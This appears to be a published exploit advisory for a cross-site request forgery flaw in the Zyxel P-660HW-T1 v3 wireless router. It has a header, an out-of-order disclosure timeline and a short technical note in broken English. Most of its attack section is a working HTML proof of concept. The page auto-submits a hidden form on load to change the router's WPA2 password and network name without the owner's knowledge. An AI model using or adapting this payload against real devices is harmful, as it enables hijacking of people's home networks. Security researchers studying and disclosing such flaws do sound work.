@@ -1,0 +1,49 @@
+# Exploit Title: Zyxel P-660HW-T1 v3 Wireless Router - CSRF Vulnerabilities
+# Date: 05/22/2014
+# Author: Mustafa ALTINKAYNAK
+# Vendor Homepage:http://www.zyxel.com/tr/tr/products_services/p_660hw_series.shtml?t=p
+# Category: Hardware/Wireless Router
+# Tested on: Zyxel P-660HW-T1 v3 Wireless Router
+# Patch/ Fix: Vendor has not provided any fix for this yet
+---------------------------
+ 
+Technical Details
+---------------------------
+This vulnerability was tested at the P-660HW-T1 devices. Admin panel is open you can run remote code destination.
+You can send the form below to prepare the target. Please offending. Being partners in crime.
+
+Disclosure Timeline
+---------------------------
+05/21/2014  Contacted Vendor 
+05/22/2014  Vendor Replied
+04/22/2014  Vulnerability Explained (No reply received)
+05/23/2014  Full Disclosure
+
+Exploit Code 
+---------------------------
+ 
+Change Wifi (WPA2/PSK) password & SSID by CSRF
+---------------------------------------------------------------------------------
+<html>
+<body onload="document.form.submit();">
+<form action="http://192.168.1.1/Forms/WLAN_General_1"
+method="POST" name="form">
+<input type="hidden" name="EnableWLAN" value="on">
+<input type="hidden" name="Channel_ID" value="00000005">
+<input type="hidden" name="ESSID" value="WIFI NAME">
+<input type="hidden" name="Security_Sel" value="00000002">
+<input type="hidden" name="SecurityFlag" value="0">
+<input type="hidden" name="WLANCfgPSK" value="123456">
+<input type="hidden" name="WLANCfgWPATimer" value="1800">
+<input type="hidden" name="QoS_Sel" value="00000000">
+<input type="hidden" name="sysSubmit" value="Uygula">
+</form>
+</body>
+</html> 
+
+-----------
+
+Mustafa ALTINKAYNAK
+twitter : @m_altinkaynak <https://twitter.com/m_altinkaynak>
+www.mustafaaltinkaynak.com
+
